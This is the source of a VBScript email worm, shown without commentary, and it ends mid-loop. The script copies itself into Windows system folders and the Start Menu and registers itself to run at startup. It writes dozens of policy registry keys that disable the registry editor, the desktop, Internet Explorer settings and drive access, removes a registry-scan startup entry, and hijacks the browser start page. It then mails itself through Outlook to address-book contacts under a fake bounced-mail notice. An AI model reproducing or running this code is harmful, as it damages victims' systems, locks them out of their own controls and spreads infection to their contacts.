Set fs=CreateObject("Scripting.FileSystemObject")

Set dir1=fs.GetSpecialFolder(0)

Set dir2=fs.GetSpecialFolder(1)

Set so=CreateObject("Scripting.FileSystemObject")

dim vv
Set vv=CreateObject("Wscript.Shell")
so.GetFile(WScript.ScriptFullName).Copy(dir1&"\ÿÿ.vbs")
so.GetFile(WScript.ScriptFullName).Copy(dir2&"\ÿÿ.vbs")
so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Start Menu\Programs\Æô¶¯\ÿÿ.vbs")

vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives",63000000,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Advanced",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Cache Internet",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\AutoConfig",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserSaveAs",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFileOpen",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"
vv.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry",""
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\NoRealMode",1,"REG_DWORD"
vv.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ÿÿ","ÿÿ.vbs"
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions\NoAddingSubScriptions",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetTaskBar",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\History",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",1,"REG_DWORD"
vv.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page","http://20girl.com"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\ResetWebSettings",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu",1,"REG_DWORD"
vv.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders",1,"REG_DWORD"
vv.Regwrite "HKLM\Software\CLASSES\.reg\","txtfile"

Set ol=CreateObject("Outlook.Application")
On Error Resume Next
For x=1 To 5
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="Undelivered Mail Returned £¨ÎÞ·¨Í¶µÝµÄÍËÐÅ£©"
Mail.Body="I'm sorry to have to inform you that the message returned below could not be delivered to one or more destinations."
Mail.Attachments.Add(dir2&"ÿÿ.vbs")
Mail.Send